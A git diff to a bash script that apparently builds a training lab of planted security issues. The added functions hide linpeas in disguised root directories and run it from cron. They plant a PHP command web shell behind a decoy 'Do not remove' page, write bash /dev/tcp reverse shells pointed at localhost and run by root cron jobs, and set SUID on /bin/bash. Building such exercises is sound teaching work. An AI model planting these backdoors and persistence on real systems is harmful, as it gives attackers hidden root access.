@@ -28,12 +28,21 @@ Main(){
   CreateSUID
   echo "Created Issue 9"
   sleep 1
+  CreateAndCronLinPEAS 3>&1 &>/dev/null
+  echo "Created Issue 10"
+  sleep 1
+  MaliciousWebServerHTTPS  3>&1 &>/dev/null
+  echo "Created Issue 11"
+  sleep 1
+  ReverseShellandPersistence 3>&1 &>/dev/null
+  echo "Created Issue 12"
+  sleep 1
   CreateGoodbye
   sleep 1
   CreateLogin 3>&1 &>/dev/null
 }
 
-# --- Jacobs Functions ---
+# --- Jacob's Functions ---
 CreateEnvironment(){
 
   for pid in $(ps aux | grep -i apt | awk '{print $2}');  do sudo kill $pid; done
@@ -299,5 +308,49 @@ echo "Script finished! Please keep this terminal open until the lab is complete.
 }
 
 # --- Jacobs Functions End---
+
+# --- Dumb Jack's Functions ---
+CreateAndCronLinPEAS(){
+#grab linpeas
+  wget https://github.com/carlospolop/PEASS-ng/releases/download/20230326/linpeas.sh
+#make linpeas.sh executable
+  chmod +x ./linpeas.sh
+#spread it around for good measure
+  mkdir '/*'
+  cp ./linpeas.sh /\*/linpeas.sh
+
+  mkdir /...
+  cp ./linpeas.sh /.../linpeas.sh
+  rm ./linpeas.sh
+
+#make a cronjob that runs it every minute, 
+  append="* *    * * *   root    bash /.../linpeas.sh"
+
+  sudo echo "$append">>"/etc/crontab"
+}
+
+MaliciousWebServerHTTPS(){
+#make web directory, create a php backdoor, and make it look convincing (index.html, and port 80)
+  mkdir /tmp/web
+  echo "<?php echo passthru($_GET['cmd']); ?>" > /tmp/web/.phpbackdoor.html
+  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /tmp/web/index.html
+  python3 -m http.server --directory /tmp/web 443 &
+  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /index.html
+}
+
+ReverseShellandPersistence(){
+  #create reverse shells, and have them get executed by cronjobs
+  echo "bash -i >& /dev/tcp/127.0.0.1/80 0>&1" > /\*/NOTEPAD.sh
+  echo "bash -i >& /dev/tcp/127.0.0.1/443 0>&1" > /.../processMonitor.sh
+append="* *    * * *   root    /*/NOTEPAD.sh"
+  sudo echo "$append">>"/etc/crontab"
+append="* *    * * *   root    /.../processMonitor.sh"
+  sudo echo "$append">>"/etc/crontab"
+
+  #chmod +s /bin/bash cuz why not
+  chmod +s /bin/bash
+  
+}
+# --- End Of Dumb Jack's Functions ---
 
 Main
